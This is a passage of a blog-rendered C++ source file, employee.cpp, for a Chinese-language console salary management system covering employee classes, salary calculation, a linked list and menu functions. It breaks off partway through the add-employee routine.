<h2 id="employee-cpp"><a href="#employee-cpp" class="headerlink" title="employee.cpp"></a>employee.cpp</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;employee.h&quot;</span></span></span><br><span class="line">Linklist head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*基类抽象函数*/</span></span><br><span class="line">Employee_base::<span class="built_in">Employee_base</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Employee_base::getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getgender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getdepartment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getlevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Employee_base::getsalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//Salary = calculateSalary();</span></span><br><span class="line">	<span class="keyword">return</span> Salary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::gettype</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*派生类构造函数*/</span></span><br><span class="line">Manager::<span class="built_in">Manager</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	MonthSalary = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;经理&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Salesperson::<span class="built_in">Salesperson</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	SalesAmount = <span class="literal">NULL</span>;</span><br><span class="line">	commision = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;销售人员&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">SalesManager::<span class="built_in">SalesManager</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	MonthSalary = <span class="literal">NULL</span>;</span><br><span class="line">	SalesAmount = <span class="literal">NULL</span>;</span><br><span class="line">	commision = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;销售经理&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Technician::<span class="built_in">Technician</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	time = <span class="literal">NULL</span>;</span><br><span class="line">	hourlyWage = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;技术人员&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*派生类成员添加函数*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Manager::addmanager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id=<span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理的月薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; MonthSalary;</span><br><span class="line">	Salary = MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Salesperson::addsalesperson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员销售额：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; SalesAmount;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员提成率：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; commision;</span><br><span class="line">	Salary = SalesAmount * commision;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SalesManager::addsalesmanager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理的月薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; MonthSalary;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理销售额：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; SalesAmount;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理提成率：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; commision;</span><br><span class="line">	Salary = (SalesAmount * commision)+ MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Technician::addtechnician</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员的时薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; hourlyWage;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员的工作时间：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; time;</span><br><span class="line">	Salary = time * hourlyWage;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::add_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*派生类工资计算函数*/</span></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Manager::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Salesperson::calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> SalesAmount * commision;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">SalesManager::calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (SalesAmount * commision) + MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Technician::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> hourlyWage * time;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Employees功能函数</span></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Employees::calculateSalary</span><span class="params">()</span><span class="type">const</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;经理&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Manager::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;销售人员&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Salesperson::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;销售经理&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> SalesManager::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (type == <span class="string">&quot;技术人员&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> Technician::<span class="built_in">calculateSalary</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::showEmployees</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; gender &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; department &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; level &lt;&lt; <span class="string">&quot;\t\t&quot;</span> &lt;&lt; Salary &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::modifyname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifygender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要修改的性别：&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifydepartment</span><span class="params">()</span></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要调换的部门：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifylevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入需要更新的级别：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::modifysalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入修改后工资：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Salary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Employees保存函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::saveid</span><span class="params">( <span class="type">int</span> Id)</span> </span>&#123;</span><br><span class="line">	id = Id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span>  <span class="title">Employees::savename</span><span class="params">(string Name)</span> </span>&#123;</span><br><span class="line">	name = Name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savegender</span><span class="params">(string Gender)</span> </span>&#123;</span><br><span class="line">	gender = Gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savedepartment</span><span class="params">(string Department)</span> </span>&#123;</span><br><span class="line">	department = Department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savelevel</span><span class="params">(string Level)</span> </span>&#123;</span><br><span class="line">	level = Level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::savesalary</span><span class="params">(<span class="type">double</span> salary)</span> </span>&#123;</span><br><span class="line">	Salary = salary;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*功能函数*/</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listlength</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> length=<span class="number">0</span>;</span><br><span class="line">	Linklist current = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		length++;</span><br><span class="line">		current = current-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_list</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	head = <span class="keyword">new</span> Node;</span><br><span class="line">	head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear_buffer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> ch;</span><br><span class="line">	<span class="keyword">while</span> ((ch = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; ch != EOF);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖          &lt;小型公司工资管理系统设计&gt;           ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              1.  添加职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              2.  查询职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              3.  显示职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              4.  编辑职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              5.  删除职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              6.  统计职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              7.  保存职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              8.  读取职工信息                 ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖              0.  结束进程                     ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字执行对应的功能:&quot;</span>;</span><br><span class="line">		choose = <span class="built_in">getchar</span>();</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="keyword">switch</span> (choose)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;<span class="comment">//添加职员信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">add_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;<span class="comment">//查询职工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">query_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;<span class="comment">//显示职工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">display_all</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: &#123;<span class="comment">//编辑员工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">modify_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: &#123;<span class="comment">//删除员工信息</span></span><br><span class="line">			<span class="built_in">delete_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>: &#123;<span class="comment">//统计员工信息</span></span><br><span class="line">			<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">			<span class="built_in">static_employee</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>: &#123;<span class="comment">//保存员工信息</span></span><br><span class="line">			<span class="built_in">save</span>();</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t\t\t\t保存成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>: &#123;<span class="comment">//读取员工信息</span></span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;读取成功！&quot;</span>&lt;&lt;endl;</span><br><span class="line">			<span class="built_in">load</span>();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: &#123;<span class="comment">//退出</span></span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;\t\t\t\t**********退出成功！**********&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ide</span><span class="params">(<span class="type">int</span> Id)</span></span>&#123;</span><br><span class="line">	Linklist temp = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (temp != <span class="literal">NULL</span>) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(temp-&gt;e.<span class="built_in">getId</span>() == Id)</span><br><span class="line">		&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;该编号已存在！请重新输入：&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cin &gt;&gt; Id;</span><br><span class="line">		&#125;</span><br><span class="line">		temp = temp-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> choose;</span><br><span class="line">	Linklist current, newNode = <span class="keyword">new</span> Node;</span><br><span class="line">	newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#123;<span class="comment">//添加职工信息</span></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╔═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╗&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                ****人员类型****               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                1、经理                        ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                2、销售人员                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                3、销售经理                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                4、技术人员                    ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                0、返回主菜单                  ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t‖                                               ‖&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t╚═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═ ═╝&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;\t\t\t\t请输入数字选择需要添加的人员类型:&quot;</span>;</span><br><span class="line">		choose = <span class="built_in">getchar</span>();</span><br><span class="line">		<span class="built_in">clear_buffer</span>();</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">		<span class="keyword">switch</span> (choose) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: &#123;<span class="comment">//添加经理</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addmanager</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: &#123;<span class="comment">//添加销售人员</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addsalesperson</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: &#123;<span class="comment">//添加销售经理</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addsalesmanager</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: &#123;<span class="comment">//添加技术人员</span></span><br><span class="line">				newNode-&gt;e.<span class="built_in">addtechnician</span>();</span><br><span class="line">				<span 